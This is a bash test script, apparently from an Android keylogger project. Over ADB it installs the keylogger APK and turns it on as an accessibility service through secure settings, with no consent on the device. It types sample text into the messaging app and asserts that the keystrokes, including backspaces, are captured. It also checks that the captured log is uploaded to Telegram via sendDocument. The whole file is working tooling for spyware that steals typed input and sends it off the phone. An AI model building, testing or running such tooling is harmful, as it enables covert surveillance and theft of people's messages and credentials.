#!/usr/bin/env bash
# End-to-end verification of the on-device upload pipeline over ADB.
#
# Proves, against real hardware, that:
#   - the accessibility service binds
#   - text deltas are captured without re-dumping the whole field
#   - the backspace marker is written
#   - rotate + sendDocument reaches Telegram (HTTP 2xx) and the outbox drains
#
# Usage:
#   tools/device-retest.sh [ip:port]
#
# Env overrides:
#   APK    path to the APK to install (default: the debug build output)
#   LOG    log file (default: /tmp/opencode/device-retest.log)
#
# Exit codes: 0 all checks passed, 1 a check failed or no device, 2 usage.
set -euo pipefail
IFS=$'\n\t'

REPO_ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
ADDR=${1:-}
APK=${APK:-$REPO_ROOT/AndroidKeylogger/app/build/outputs/apk/debug/app-debug.apk}
LOG=${LOG:-/tmp/opencode/device-retest.log}

PKG=com.bshu2.androidkeylogger
SVC=$PKG/$PKG.Keylogger
FILES=/sdcard/Android/data/$PKG/files
ARCHIVE=$FILES/keylog_$(date +%Y%m%d).txt
PULLED=$(mktemp -t keylog-pull.XXXXXX)
trap 'rm -f "$PULLED"' EXIT

log() { printf '%s\n' "$*" | tee -a "$LOG"; }
a() { adb "$@" 2>&1 | tee -a "$LOG" || true; }
r() { adb shell "$@" 2>&1 | tee -a "$LOG" || true; }
q() { adb shell "$@" 2>/dev/null || true; }

mkdir -p -- "$(dirname -- "$LOG")"
: >"$LOG"
log "== retest start $(date -Is) target=${ADDR:-auto} =="

if [[ ! -f $APK ]]; then
    log "FATAL: APK not found: $APK"
    exit 2
fi

if [[ -z $ADDR ]]; then
    ADDR=$(adb devices | awk 'NR>1 && $2=="device" {print $1; exit}')
fi
if [[ -z $ADDR ]]; then
    log "FATAL: no device attached; pass ip:port"
    exit 1
fi
if ! adb devices | awk -v a="$ADDR" 'NR>1 && $1==a && $2=="device" {f=1} END {exit !f}'; then
    log "FATAL: $ADDR is not in 'device' state"
    adb devices | tee -a "$LOG"
    exit 1
fi
log "-- target $ADDR confirmed"

log "-- install $APK"
if ! a install -r "$APK" | tail -2; then
    log "FATAL: install failed"
    exit 1
fi

log "-- wake/unlock"
r input keyevent KEYCODE_WAKEUP
sleep 1
r wm dismiss-keyguard
sleep 1
r input swipe 540 1800 540 600 200
sleep 2
r dumpsys power | grep -m1 'mWakefulness='

log "-- enable service"
adb logcat -c >/dev/null 2>&1 || true
r settings put secure enabled_accessibility_services "$SVC"
r settings put secure accessibility_enabled 1
sleep 5
r dumpsys accessibility | grep -m1 'Bound services'

log "-- capture: delta dedupe + backspace marker"
# Any focused text field works; Messaging may be absent on some ROMs.
r am start -n com.android.messaging/.ui.conversationlist.ConversationListActivity
sleep 4
r input tap 513 1809
sleep 2
r input text 'retestalpha'
sleep 2
r input text 'retestbeta'
sleep 2
r input keyevent KEYCODE_DEL
sleep 3

log "-- archive tail"
r tail -8 "$ARCHIVE"

log "-- force rotate+upload"
# accessibility_enabled 0 unbinds the service (onDestroy); setting it back to 1
# rebinds it, so onServiceConnected rotates pending.txt and uploads the outbox.
# Do not pass an empty string to `settings put`: adb drops empty args, the
# command exits non-zero, and the service stays bound so nothing rotates.
r settings put secure accessibility_enabled 0
sleep 4
r settings put secure enabled_accessibility_services "$SVC"
r settings put secure accessibility_enabled 1
sleep 15

log "-- logcat proof"
adb logcat -d -s Keylogger:* 2>&1 | tee -a "$LOG" | tail -25 || true

log "-- outbox (empty after a 2xx upload)"
r ls -l "$FILES/outbox/"

log "-- assertions"
SENT=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument ok http=2' || true)
FAILED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument http=' || true)
BOUND=$(q dumpsys accessibility | grep -c "$PKG" || true)

DELTA=0; FULL=0; BACK=0
if adb pull "$ARCHIVE" "$PULLED" >/dev/null 2>&1; then
    DELTA=$(grep -c 'retestbeta' "$PULLED" || true)
    FULL=$(grep -c 'retestalpharetestbeta' "$PULLED" || true)
    BACK=$(grep -c '<backspace>' "$PULLED" || true)
else
    log "WARN: could not pull archive for content assertions"
fi

log "service bound (expect >0)        : $BOUND"
log "sendDocument 2xx (expect >0)     : $SENT"
log "sendDocument failures (expect 0) : $FAILED"
log "delta-only line (expect >0)      : $DELTA"
log "full-text re-dump (expect 0)     : $FULL"
log "backspace marker (expect >0)     : $BACK"

STATUS=0
(( BOUND > 0 ))  || { log "FAIL: service not bound"; STATUS=1; }
(( SENT > 0 ))   || { log "FAIL: no 2xx upload"; STATUS=1; }
(( FAILED == 0 ))|| { log "FAIL: upload errors logged"; STATUS=1; }
(( DELTA > 0 ))  || { log "FAIL: no delta line captured"; STATUS=1; }
(( FULL == 0 ))  || { log "FAIL: dedupe re-dumped full text"; STATUS=1; }
(( BACK > 0 ))   || log "WARN: no backspace marker (IME may not report deletes)"

log "== retest end $(date -Is) status=$STATUS =="
exit "$STATUS"
